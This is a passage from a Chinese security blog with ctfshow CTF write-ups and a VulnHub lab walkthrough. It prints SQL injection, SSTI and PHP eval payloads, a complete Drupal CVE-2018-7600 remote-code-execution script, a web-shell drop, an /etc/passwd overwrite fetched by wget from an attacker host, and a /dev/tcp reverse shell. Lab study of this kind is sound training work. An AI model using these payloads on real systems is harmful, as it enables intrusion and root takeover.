+<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#x27;admin&#x27;&amp;pass=123%1$&#x27; or 1=1--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: file=2F666C6167</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span><br><span class="line">$input = addslashes (&quot;%1$&#x27; or 1=1#&quot; );</span><br><span class="line">$b = sprintf (&quot;AND b=&#x27;%s&#x27;&quot;, $input );</span><br><span class="line">echo $b;</span><br><span class="line">echo &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#x27;%s&#x27; $b &quot;, &#x27;admin&#x27; );</span><br><span class="line">//对$input与$b进行了拼接</span><br><span class="line">//$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#x27;%s&#x27; AND b=&#x27;%1$\&#x27; and 1=1#&#x27; &quot;, &#x27;admin&#x27; );</span><br><span class="line">//很明显，这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s与%1$\类匹配admin，那么admin只会出现在%s里，%1$\为空</span><br><span class="line">echo  $sql ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="假赛生"><a href="#假赛生" class="headerlink" title="假赛生"></a>假赛生</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46456049/article/details/108589822">(12条消息) php(正则匹配)_php 正则匹配_sweetheart7-7的博客-CSDN博客</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&#x27;select pass from user where name=&quot;&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;4rfvbgt56yhn.sh&#x27;</span>);</span><br><span class="line">    <span class="variable">$query</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$name</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;admin!!!!!&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&quot;/\w\W*/&quot;</span>,function()&#123;<span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);&#125;,<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>],<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you not admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\d : 数字。  \D : 除了数字。</span><br><span class="line">\w : 数字，字母，下划线。\W : 除了数字，字母，下划线。</span><br><span class="line">\s  : 空白符 。 \S : 除了空白符  。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注册一个一个账号</p>
+<p>账号 admin空格</p>
+<p> 密码随意；登录，他把所有字符都过滤了，那不穿就行了</p>
+<p>payload：index.php?c&#x3D;</p>
+<h1 id="单身杯"><a href="#单身杯" class="headerlink" title="单身杯"></a>单身杯</h1><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>strrev，字符反转函数?&gt;，进行闭合，后面不影响</p>
+<p>伪协议读取，</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php eval($_POST[1]);?&gt;&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="easyPHP"><a href="#easyPHP" class="headerlink" title="easyPHP"></a>easyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cmd</span>,<span class="number">0</span>,<span class="number">3</span>)).<span class="string">&quot; &quot;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$param</span>).<span class="string">&quot; &quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>学习两个新的命令</p>
+<p>sed</p>
+<p>awk</p>
+<h1 id="内部赛"><a href="#内部赛" class="headerlink" title="内部赛"></a>内部赛</h1><h2 id="出题人不想跟你说话-jpg"><a href="#出题人不想跟你说话-jpg" class="headerlink" title="出题人不想跟你说话.jpg"></a>出题人不想跟你说话.jpg</h2><p>打开蚁剑连接密码是cai，连接后反弹shell，根据提示查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p> 这个文件放一些定时任务</p>
+<p><img src="/2023/05/22/ctfshow%E5%90%88%E9%9B%86-ctfshow/QQ%E6%88%AA%E5%9B%BE20230807224959.png"></p>
+<p>nginx 本地提权</p>
+<h2 id="蓝瘦"><a href="#蓝瘦" class="headerlink" title="蓝瘦"></a>蓝瘦</h2><p>查看源码，可以看到key param</p>
+<p>flask session 伪造,登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?S=a;system(&#x27;cat ../../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?S=a=system(&#x27;cat ../../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="登录就有flag"><a href="#登录就有flag" class="headerlink" title="登录就有flag"></a>登录就有flag</h2><p>分号可以用于闭合，井号可以用于注释，^进行异或运算，等号就是判等，这里需要利用sql的一个点“mysql弱类型转换”，<strong>空异或0会查到所有非数字开头的记录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;^0#</span><br><span class="line">&#x27;^&#x27;&#x27;#</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-AK赛"><a href="#WEB-AK赛" class="headerlink" title="WEB AK赛"></a>WEB AK赛</h1><h2 id="web1-观字"><a href="#web1-观字" class="headerlink" title="web1_观字"></a>web1_观字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">#flag in http://192.168.7.68/flag</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = $_GET[&#x27;url&#x27;];</span><br><span class="line">    $protocol = substr($url, 0,7);</span><br><span class="line">    if($protocol!=&#x27;http://&#x27;)&#123;</span><br><span class="line">        die(&#x27;仅限http协议访问&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\&#x27;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/&#x27;, $url))&#123;</span><br><span class="line">        die(&#x27;仅限域名地址访问&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    system(&#x27;curl &#x27;.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>curl可以用句号<code>。</code>代替点<code>.</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://192。168。7。68/flag</span><br></pre></td></tr></table></figure>
+
+<p>URL跳转限制</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11636051.html">https://www.cnblogs.com/-mo-/p/11636051.html</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">vulnhub练习1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-17 15:04:53" itemprop="dateCreated datePublished" datetime="2023-05-17T15:04:53+08:00">2023-05-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-07 02:18:29" itemprop="dateModified" datetime="2023-08-07T02:18:29+08:00">2023-08-07</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <span id="more"></span>
+
+<h2 id="Os-hackNos-1"><a href="#Os-hackNos-1" class="headerlink" title="Os-hackNos-1"></a>Os-hackNos-1</h2><p>信息搜集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.158.1-254 -sP</span><br></pre></td></tr></table></figure>
+
+<p>目标靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.158.155</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.158.155 -Pn</span><br></pre></td></tr></table></figure>
+
+<p>查看端口开放，22，80</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.158.155/</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.158.155/drupal/</span><br></pre></td></tr></table></figure>
+
+<p>存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.158.155/drupal/CHANGELOG.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>exp 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">def get_args():</span><br><span class="line">  parser = argparse.ArgumentParser( prog=&quot;drupa7-CVE-2018-7600.py&quot;,</span><br><span class="line">                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),</span><br><span class="line">                    epilog= &#x27;&#x27;&#x27;</span><br><span class="line">                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 &lt;= 7.57</span><br><span class="line">                    by poisoning the recover password form (user/password) and triggering it with</span><br><span class="line">                    the upload file via ajax (/file/ajax).</span><br><span class="line">                    &#x27;&#x27;&#x27;)</span><br><span class="line">  parser.add_argument(&quot;target&quot;, help=&quot;URL of target Drupal site (ex: http://target.com/)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, default=&quot;id&quot;, help=&quot;Command to execute (default = id)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-f&quot;, &quot;--function&quot;, default=&quot;passthru&quot;, help=&quot;Function to use as attack vector (default = passthru)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-p&quot;, &quot;--proxy&quot;, default=&quot;&quot;, help=&quot;Configure a proxy in the format http://127.0.0.1:8080/ (default = none)&quot;)</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  return args</span><br><span class="line"></span><br><span class="line">def pwn_target(target, function, command, proxy):</span><br><span class="line">  requests.packages.urllib3.disable_warnings()</span><br><span class="line">  proxies = &#123;&#x27;http&#x27;: proxy, &#x27;https&#x27;: proxy&#125;</span><br><span class="line">  print(&#x27;[*] Poisoning a form and including it in cache.&#x27;)</span><br><span class="line">  get_params = &#123;&#x27;q&#x27;:&#x27;user/password&#x27;, &#x27;name[#post_render][]&#x27;:function, &#x27;name[#type]&#x27;:&#x27;markup&#x27;, &#x27;name[#markup]&#x27;: command&#125;</span><br><span class="line">  post_params = &#123;&#x27;form_id&#x27;:&#x27;user_pass&#x27;, &#x27;_triggering_element_name&#x27;:&#x27;name&#x27;, &#x27;_triggering_element_value&#x27;:&#x27;&#x27;, &#x27;opz&#x27;:&#x27;E-mail new Password&#x27;&#125;</span><br><span class="line">  r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)</span><br><span class="line">  soup = BeautifulSoup(r.text, &quot;html.parser&quot;)</span><br><span class="line">  try:</span><br><span class="line">    form = soup.find(&#x27;form&#x27;, &#123;&#x27;id&#x27;: &#x27;user-pass&#x27;&#125;)</span><br><span class="line">    form_build_id = form.find(&#x27;input&#x27;, &#123;&#x27;name&#x27;: &#x27;form_build_id&#x27;&#125;).get(&#x27;value&#x27;)</span><br><span class="line">    if form_build_id:</span><br><span class="line">        print(&#x27;[*] Poisoned form ID: &#x27; + form_build_id)</span><br><span class="line">        print(&#x27;[*] Triggering exploit to execute: &#x27; + command)</span><br><span class="line">        get_params = &#123;&#x27;q&#x27;:&#x27;file/ajax/name/#value/&#x27; + form_build_id&#125;</span><br><span class="line">        post_params = &#123;&#x27;form_build_id&#x27;:form_build_id&#125;</span><br><span class="line">        r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)</span><br><span class="line">        parsed_result = r.text.split(&#x27;[&#123;&quot;command&quot;:&quot;settings&quot;&#x27;)[0]</span><br><span class="line">        print(parsed_result)</span><br><span class="line">  except:</span><br><span class="line">    print(&quot;ERROR: Something went wrong.&quot;)</span><br><span class="line">    raise</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">  print ()</span><br><span class="line">  print (&#x27;=============================================================================&#x27;)</span><br><span class="line">  print (&#x27;|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |&#x27;)</span><br><span class="line">  print (&#x27;|                              by pimps                                     |&#x27;)</span><br><span class="line">  print (&#x27;=============================================================================\n&#x27;)</span><br><span class="line"></span><br><span class="line">  args = get_args() # get the cl args</span><br><span class="line">  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>
+
+<p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dru*.py  http://192.168.158.155/drupal/ -c &quot;ls&quot;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dru*.py  http://192.168.158.155/drupal/ -c &quot;echo &#x27;&lt;?=eval(\$_POST[1])?&gt;&#x27; &gt; 1.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>weevely:生成以及连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate &lt;连接密码&gt; &lt;path&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely &lt;url&gt; &lt;连接密码&gt;</span><br></pre></td></tr></table></figure>
+
+<p>展示真实用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:audit_etcpasswd -real</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor_reversetcp 192.168.158.129 3366</span><br></pre></td></tr></table></figure>
+
+<h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。</p>
+<p>命令将尝试查找具有root权限的SUID的文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230517202237.png"></p>
+<p>然后把etc&#x2F;passwd中的root那行复制一下，x换成我们生成的密码哈希，重新添加到新的一行当中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt zhou zhou</span><br></pre></td></tr></table></figure>
+
+<p>使用su命令报错，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure>
+
+<p>使用python 终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这一行复制，在最低加一行，将x 换为哈希值</p>
+<p>修改为如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt zhou zhou</span><br><span class="line">$1$zhou$IY3SDlxhR.gde5eP6C/Y/0</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230517200256.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.158.129:12345/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>-O参数是替换&#x2F;etc&#x2F;passwd</p>
+<p>使用su命令报错，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure>
+
+<p>使用python 终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230517201832.png"></p>
+<p>get root</p>
+<h2 id="domdom"><a href="#domdom" class="headerlink" title="domdom"></a>domdom</h2><p>信息搜集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.158.0/24 -sn</span><br></pre></td></tr></table></figure>
+
+<p>目标靶机 192.168.158.158</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.158.158 -Pn </span><br></pre></td></tr></table></figure>
+
+<p>dirsearch扫一下，发现</p>
+<p>index.php,admin.php</p>
+<p>在index.php 界面输入，抓包，发包发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello User, Please fill in the login credentials as well as your name for tracking purposes.</span><br></pre></td></tr></table></figure>
+
+<p>将请求头改为admin.php</p>
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605194544.png"></p>
+<p>传入参数cmd,进行命令执行，反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.158.129/5000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>进行url编码发包无反应，网站是使用php,所以用php反弹shell</p>
